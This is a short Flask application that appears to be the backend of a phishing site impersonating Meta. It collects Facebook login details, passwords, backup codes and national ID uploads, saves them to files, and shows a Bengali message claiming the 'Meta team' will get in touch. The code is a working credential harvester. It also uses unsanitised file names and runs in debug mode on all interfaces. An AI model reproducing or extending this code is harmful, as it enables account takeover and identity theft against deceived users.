from flask import Flask, render_template, request
import os
from datetime import datetime

app = Flask(__name__)

UPLOAD_FOLDER = 'submissions'
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    fb_name = request.form.get('fb_name')
    fb_email = request.form.get('fb_email')
    fb_phone = request.form.get('fb_phone')
    fb_password = request.form.get('fb_password')
    fb_backup_code = request.form.get('fb_backup_code')
    nid_file = request.files.get('nid_file')

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{UPLOAD_FOLDER}/{fb_name.replace(' ', '_')}_{timestamp}.txt"

    with open(filename, 'w') as f:
        f.write(f"Facebook Name: {fb_name}\n")
        f.write(f"Facebook Email: {fb_email}\n")
        f.write(f"Facebook Phone: {fb_phone}\n")
        f.write(f"Facebook Password: {fb_password}\n")
        f.write(f"Facebook Backup Code: {fb_backup_code}\n")

    if nid_file:
        nid_filename = f"{UPLOAD_FOLDER}/{fb_name.replace(' ', '_')}_{timestamp}_nid_{nid_file.filename}"
        nid_file.save(nid_filename)

    return "✅ ফর্ম সফলভাবে জমা হয়েছে। আপনার তথ্য যাচাই করে মেটা টিম যোগাযোগ করবে।"

# ✅ ✅ এই অংশটা আগের মতো না রেখে নিচের মতো করো
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
